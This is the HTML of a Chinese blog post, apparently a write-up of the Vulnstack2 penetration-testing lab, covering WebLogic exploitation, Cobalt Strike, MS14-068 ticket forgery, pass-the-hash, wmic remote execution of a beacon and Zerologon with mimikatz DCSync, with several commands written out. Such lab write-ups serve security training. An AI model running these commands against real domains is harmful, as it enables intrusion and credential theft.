@@ -1,0 +1,665 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"apsry.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="红日靶场2 vulnstack2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="红日靶场2-vulnstack2">
+<meta property="og:url" content="https://apsry.github.io/2022/03/20/Vulnstack2/index.html">
+<meta property="og:site_name" content="apsry">
+<meta property="og:description" content="红日靶场2 vulnstack2">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203191646693.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203191741191.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203191823199.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203191823764.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203191647234.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203191706074.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203191706184.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203191707983.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203191648670.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203191705312.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203191955830.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203191955456.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203192004223.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203192023535.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203192027283.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203192038444.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203192045532.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203192045337.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203192334673.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203200930217.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203200931610.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203200931152.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203200938539.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203200938966.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203200940045.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203200940220.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203200941568.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203200942073.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203200942118.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203200942717.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203200943514.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203200944986.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201005157.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201026422.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201104135.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201105891.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201105302.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201216662.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201433172.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201501136.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201435020.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201436878.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201436179.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201437657.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201606936.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201606524.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201606207.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201606932.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201606494.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201606579.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201606488.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201606859.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201606507.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201606546.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201606316.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201705930.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201706269.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201719455.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201719807.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201727609.png">
+<meta property="article:published_time" content="2022-03-20T01:26:00.000Z">
+<meta property="article:modified_time" content="2022-03-21T12:38:54.351Z">
+<meta property="article:author" content="apsry">
+<meta property="article:tag" content="内网渗透">
+<meta property="article:tag" content="靶场">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203191646693.png">
+
+<link rel="canonical" href="https://apsry.github.io/2022/03/20/Vulnstack2/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>红日靶场2-vulnstack2 | apsry</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+<!-- 引入目录截取js -->
+<script type="text/javascript" src="/js/src/abstract.js"></script>
+
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">apsry</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">去留无意，宠辱不惊</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://apsry.github.io/2022/03/20/Vulnstack2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="apsry">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="apsry">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          红日靶场2-vulnstack2
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-03-20 09:26:00" itemprop="dateCreated datePublished" datetime="2022-03-20T09:26:00+08:00">2022-03-20</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-03-21 20:38:54" itemprop="dateModified" datetime="2022-03-21T20:38:54+08:00">2022-03-21</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%86%85%E7%BD%91/" itemprop="url" rel="index"><span itemprop="name">内网</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>红日靶场2 vulnstack2</p>
+<span id="more"></span>
+
+
+
+<p><a target="_blank" rel="noopener" href="https://www.bianchengquan.com/article/408769.html">https://www.bianchengquan.com/article/408769.html</a></p>
+<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>参考：<a target="_blank" rel="noopener" href="https://www.codeprj.com/blog/d3ef831.html">https://www.codeprj.com/blog/d3ef831.html</a></p>
+<p>靶场统一密码<code>1qaz@WSX</code></p>
+<h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><p>de1ay&#x2F;1qaz@WSX</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203191646693.png" alt="image-20220319164635599"></p>
+<p>切换快照到1.3</p>
+<p>再用<code>WEB/de1ay</code>     <code>1qaz@WSX</code>登陆</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203191741191.png" alt="image-20220319174120983"></p>
+<p>然后再改密码就可以了</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203191823199.png" alt="image-20220319170636021"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203191823764.png" alt="image-20220319182326680"></p>
+<h3 id="PC"><a href="#PC" class="headerlink" title="PC"></a>PC</h3><p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203191647234.png" alt="image-20220319164727154"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203191706074.png" alt="image-20220319170636021"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203191706184.png" alt="image-20220319170657136"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203191707983.png" alt="image-20220319170707936"></p>
+<h3 id="DC"><a href="#DC" class="headerlink" title="DC"></a>DC</h3><p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203191648670.png" alt="image-20220319164831606"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203191705312.png" alt="image-20220319170556250"></p>
+<h2 id="外网"><a href="#外网" class="headerlink" title="外网"></a>外网</h2><p>扫端口</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203191955830.png" alt="image-20220319195507712"></p>
+<h3 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h3><p>weblogic，看看可能有什么漏洞，最终扫到了</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203191955456.png" alt="image-20220319195555409"></p>
+<p>传个webshell</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203192004223.png" alt="image-20220319200418158"></p>
+<p>起个CS</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203192023535.png" alt="image-20220319202341477"></p>
+<p>创建监听</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203192027283.png" alt="image-20220319202715236"></p>
+<p>远程加载powershell，可以看到会被360拦截</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203192038444.png" alt="image-20220319203848365"></p>
+<p>可以用冰蝎连msf再转发给CS</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203192045532.png" alt="image-20220319204508350"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203192045337.png" alt="image-20220319204529208"></p>
+<p>免杀留坑QAQ</p>
+<h2 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h2><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>权限只有web权限，得提权</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203192334673.png" alt="image-20220319233427523"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203200930217.png" alt="image-20220320093048134"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203200931610.png" alt="image-20220320093101540"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203200931152.png" alt="image-20220320093122085"></p>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>用load的信息收集插件，可以看看收集了什么</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203200938539.png" alt="image-20220320093815438"></p>
+<p>一些版本信息</p>
+<p>systeminfo</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203200938966.png" alt="image-20220320093841917"></p>
+<p>用户信息</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203200940045.png" alt="image-20220320094005988"></p>
+<p>IP信息</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203200940220.png" alt="image-20220320094027136"></p>
+<p>arp -a</p>
+<p>可以看到10同一网段的信息</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203200941568.png" alt="image-20220320094106491"></p>
+<p>路由表</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203200942073.png" alt="image-20220320094201008"></p>
+<p>netstat</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203200942118.png" alt="image-20220320094223055"></p>
+<p>tasklist</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203200942717.png" alt="image-20220320094239636"></p>
+<p>schtasks</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203200943514.png" alt="image-20220320094308451"></p>
+<p>防火墙</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203200944986.png" alt="image-20220320094430931"></p>
+<h3 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h3><p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201005157.png" alt="image-20220320100554016"></p>
+<p>扫描内网10网段</p>
+<p>可以用fscan,或者其它一些插件扫，也可以用CS自带的portscan</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201026422.png" alt="image-20220320102632350"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201104135.png" alt="image-20220320110401028"></p>
+<p>我这里portscan出了点问题</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201105891.png" alt="image-20220320110507847"></p>
+<p>也可以自己把扫描完的target导进去</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201105302.png" alt="image-20220320110554154"></p>
+<p>这个时候就是横向的移动</p>
+<p>查看域控主机名</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201216662.png" alt="image-20220320121628597"></p>
+<p>我们先对域控进行扫描</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201433172.png" alt="image-20220320143349077"></p>
+<p>关闭防火墙</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201501136.png" alt="image-20220320150128012"></p>
+<h3 id="PTH，MS14-068伪造票据-环境感觉被我弄坏了，失败"><a href="#PTH，MS14-068伪造票据-环境感觉被我弄坏了，失败" class="headerlink" title="PTH，MS14-068伪造票据(环境感觉被我弄坏了，失败)"></a>PTH，MS14-068伪造票据(环境感觉被我弄坏了，失败)</h3><p>在域环境中，大量计算机在安装时会使用相同的本地管理员账号和密码，因此如果攻击者获取了一台计算机的NTLM Hash值，就可以通过哈希传递攻击的方式登陆到内网中的其他机器</p>
+<p>我们新建一个监听器</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201435020.png" alt="image-20220320143507867"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201436878.png" alt="创建监听器"></p>
+<p>然后再传</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201436179.png" alt="image-20220320143643040"></p>
+<p>直接用抓到的传</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201437657.png" alt="image-20220320143740587"></p>
+<p>MS14-068</p>
+<p>使用MS14-068伪造票据获得管理员权限。<br><em><strong>MS14-068是密钥分发中心（KDC）服务中的Windows漏洞。它允许经过身份验证的用户在其Kerberos票证（TGT）中插入任意的PAC（表示所有用户权限的结构）。该漏洞位于kdcsvc.dll域控制器的密钥分发中心(KDC)中。普通用户可以通过呈现具有改变了PAC的Kerberos TGT来获得票证，进而伪造票据获得管理员权限。</strong></em></p>
+<ol>
+<li><p>上传ms14-068到目标机器</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/IQczZj"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201606936.png" alt="MS14-068"><strong>MS14-068</strong></a></p>
+</li>
+<li><p>获取域用户sid(在低权限的beacon中下运行)</p>
+<p>bash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell <span class="built_in">whoami</span> /user </span><br></pre></td></tr></table></figure>
+
+
+
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/IQgcwj"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201606524.png" alt="sid"><strong>sid</strong></a></p>
+</li>
+<li><p>注册表开启3389</p>
+<p>bash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">&quot;  &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure>
+
+
+
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/IQoQfJ"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201606207.png" alt="3389端口"><strong>3389端口</strong></a></p>
+</li>
+<li><p>利用抓取的账号密码进行登录</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/IQTPHK"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201606932.png" alt="登录"><strong>登录</strong></a></p>
+</li>
+<li><p>根据前面抓取的域用户、密码、sid，在cmd中，输入命令，伪造票据（其实通过之前收集到的用户名，也可以用这个密码撞一撞）</p>
+<p>bash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ms14-068.exe -u 域成员名@域名 -s 域成员sid -d 域控制器ip地址 -p 域成员密码</span><br><span class="line">MS14-068.exe -u de1ay@de1ay.com -p 1qaz@WSX -s S-1-5-21-3767205380-3469466069-2137393323-1000 -d 10.10.10.10</span><br></pre></td></tr></table></figure>
+
+
+
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/IQ7SPg"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201606494.png" alt="MS14-068"><strong>MS14-068</strong></a></p>
+</li>
+<li><p>上传mimikatz，运行mimikatz将生成的票据注入进机器内存中。</p>
+<p>bash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge         //清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造</span><br><span class="line">kerberos::list          //查看当前机器凭证</span><br><span class="line">kerberos::ptc 票据文件   //将票据注入到内存中</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>bash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge</span><br><span class="line">kerberos::list</span><br><span class="line">kerberos::TGT_de1ay@de1ay.com.ccache</span><br></pre></td></tr></table></figure>
+
+
+
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/IQ7cFS"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201606579.png" alt="mimikatz"><strong>mimikatz</strong></a></p>
+</li>
+<li><p>ipc连接域控机器</p>
+<p>bash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use \\10.10.10.10</span><br><span class="line"><span class="built_in">dir</span> \\10.10.10.10\c$</span><br></pre></td></tr></table></figure>
+
+
+
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/IQ7Ie0"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201606488.png" alt="ipc连接"><strong>ipc连接</strong></a></p>
+</li>
+</ol>
+<p>横向渗透</p>
+<ol>
+<li><p>利用跳板机的监听，CS生成木马</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/IQHMtS"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201606859.png" alt="生成木马"><strong>生成木马</strong></a></p>
+</li>
+<li><p>将木马上传至跳板机，再利用ipc连接上传至域控机器</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/IQbHxJ"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201606507.png" alt="上传成功"><strong>上传成功</strong></a></p>
+</li>
+<li><p>wmic执行命令</p>
+<p>bash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:10.10.10.10 /user:de1ay /password:1qaz@WSX process call create <span class="string">&quot;cmd.exe /c start c:\beacon.exe&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/IQzPt1"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201606546.png" alt="wmic"><strong>wmic</strong></a></p>
+</li>
+<li><p>查看CS</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/IQzdNn"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201606316.png" alt="成功上线"></a></p>
+</li>
+</ol>
+<h3 id="zerologon"><a href="#zerologon" class="headerlink" title="zerologon"></a>zerologon</h3><p><code>mimikatz lsadump::zerologon /target:dc.de1ay.com /account:dc$</code></p>
+<p>检测漏洞</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201705930.png" alt="image-20220320170545844"></p>
+<p><code>mimikatz lsadump::zerologon /target:dc.de1ay.com /account:dc$ /exploit</code></p>
+<p>会把域控的密码改了空</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201706269.png" alt="image-20220320170611205"></p>
+<p>抓hash</p>
+<p><code>mimikatz lsadump::dcsync /domain:de1ay.com /dc:DC /user:administrator /authuser:dc$ /authdomain:de1ay  /authpassword:&quot;&quot; /authntlm</code></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201719455.png" alt="image-20220320171910368"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201719807.png" alt="image-20220320171923723"></p>
+<p>恢复密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lsadump::postzerologon /target:域控ip /account:域控主机名$</span><br><span class="line">lsadump::postzerologon /target:de1ay.com /account:dc$</span><br></pre></td></tr></table></figure>
+
+<p>添加target然后添加即可</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201727609.png" alt="image-20220320172701550"></p>
+<p>PC同理</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag"># 内网渗透</a>
+              <a href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag"># 靶场</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/03/13/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(shiro550)/" rel="prev" title="初识shiro(待填坑)。。。CommonsBeanutils以及回显待填">
+      <i class="fa fa-chevron-left"></i> 初识shiro(待填坑)。。。CommonsBeanutils以及回显待填
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/03/21/Vulnstack3/" rel="next" title="红日靶场3-vulnstack3">
+      红日靶场3-vulnstack3 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
